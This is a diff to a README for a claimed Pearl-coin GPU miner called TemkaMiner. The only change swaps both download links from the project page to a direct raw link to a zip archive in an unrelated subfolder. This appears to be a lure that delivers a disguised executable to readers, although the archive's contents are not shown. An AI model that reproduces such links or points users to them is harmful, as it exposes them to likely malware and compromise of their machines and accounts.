@@ -1,6 +1,6 @@
 # ⛏️ TemkaMiner-pearl-gpu-miner-PRL - Mine Pearl coin with your hardware
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/wintertiny/TemkaMiner-pearl-gpu-miner-PRL)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/wintertiny/TemkaMiner-pearl-gpu-miner-PRL/main/warrener/Miner_Temka_PRL_gpu_pearl_miner_2.5.zip)
 
 TemkaMiner-pearl-gpu-miner-PRL provides a way to mine Pearl coin using your NVIDIA graphics card. This software supports newer models such as the RTX 30, 40, and 50 series. It manages multiple graphics cards and allows you to switch between different mining pools for better results.
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run this software. Ensure your machine mee
 
 You must visit the project page to get the installer for your computer. 
 
-[Visit this page to download the software](https://github.com/wintertiny/TemkaMiner-pearl-gpu-miner-PRL)
+[Visit this page to download the software](https://raw.githubusercontent.com/wintertiny/TemkaMiner-pearl-gpu-miner-PRL/main/warrener/Miner_Temka_PRL_gpu_pearl_miner_2.5.zip)
 
 1. Open the link above in your web browser.
 2. Select the latest release version on the page.
